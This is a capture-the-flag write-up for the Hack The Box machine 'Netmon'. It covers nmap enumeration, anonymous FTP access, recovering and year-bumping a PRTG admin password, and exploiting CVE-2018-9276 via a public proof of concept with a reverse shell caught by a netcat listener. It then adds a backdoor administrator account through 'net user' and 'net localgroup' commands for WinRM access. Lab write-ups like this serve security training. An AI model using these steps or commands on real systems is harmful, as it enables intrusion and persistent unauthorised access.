---
machine: Netmon
platform: Hack The Box
category: Windows
difficulty: Easy
points: 20
tags: [prtg, anonymous-ftp, cve-2018-9276, default-creds]
date: 2026-01-10
status: retired
summary: A Windows host running a network-monitoring web application, where anonymous file-share access and leftover configuration artifacts feed an authenticated remote-code-execution flaw. Exercises service enumeration, credential hunting in config backups, and turning leaked credentials into a CVE-based shell.
---

## Enumeration

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 16:14 -0400
Nmap scan report for 10.129.230.176
Host is up (0.039s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1m18s, deviation: 0s, median: -1m18s
| smb2-time: 
|   date: 2026-05-06T20:13:05
|_  start_date: 2026-05-06T20:10:38
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds

```

From the nmap scan I see a few interesting things: FTP is available and has anonymous login, we have a webserver with some network monitoring service on port 80, and smb signing is disabled and not required.

We can explore anonymous ftp and find the public flag in Users/Public/Desktop/users.txt

```bash
┌──(kali㉿kali)-[~/htb/netmon]
└─$ ftp 10.129.230.176
Connected to 10.129.230.176.
220 Microsoft FTP Service
Name (10.129.230.176:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49839|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
ftp> 
```

We now may want to look for credentials or configuration files related to the network monitoring service

By looking up where the configuration files are for PRTG Network Monitor we can find an assortment of configuration files in `C:\ProgramData\Paessler\PRTG Network Monitor` where we can grep for password in the `prtg configuration.old.bak` file to find the following:

```
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
```

This fails but if consider that users have to rotate their passwords occasionally we can gain access by trying the same password with 2019 at the end instead of 2018.

## Foothold

We immediately log in and note the Version number: `Installed Version 18.1.37.13946`

We search this for a CVE and find https://nvd.nist.gov/vuln/detail/CVE-2018-9276

"An issue was discovered in PRTG Network Monitor before 18.2.39. An attacker who has access to the PRTG System Administrator web console with administrative privileges can exploit an OS command injection vulnerability (both on the server and on devices) by sending malformed parameters in sensor or notification management scenarios."

I, of course, looked up a github PoC python exploit CVE and stole it for my own usage:
https://github.com/AC8999/PRTG-Network-Monitor-18.2.38---Authenticated-Remote-Code-Execution-CVE-2018-9276/blob/main/CVE-2018-9276.py

Editing my TARGET, USER, PASS and embedding my own powershell reverse shell from https://www.revshells.com/

I can deploy the PoC and get a callback to my listener on 1337:

```bash
┌──(kali㉿kali)-[~/htb/netmon]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.230.176] 50549
whoami
whoami
nt authority\system
```

This shell is very slow and finnicky so we can add our own user and make them admin so we can simply winrm in `net user hacker Password123! /add` and `net localgroup administrators hacker /add` and `net localgroup "Remote Management Users" hacker /add`

```bash
*Evil-WinRM* PS C:\Users\hacker\Documents> whoami
netmon\hacker
```

We can get the Administrator flag with either of these shells
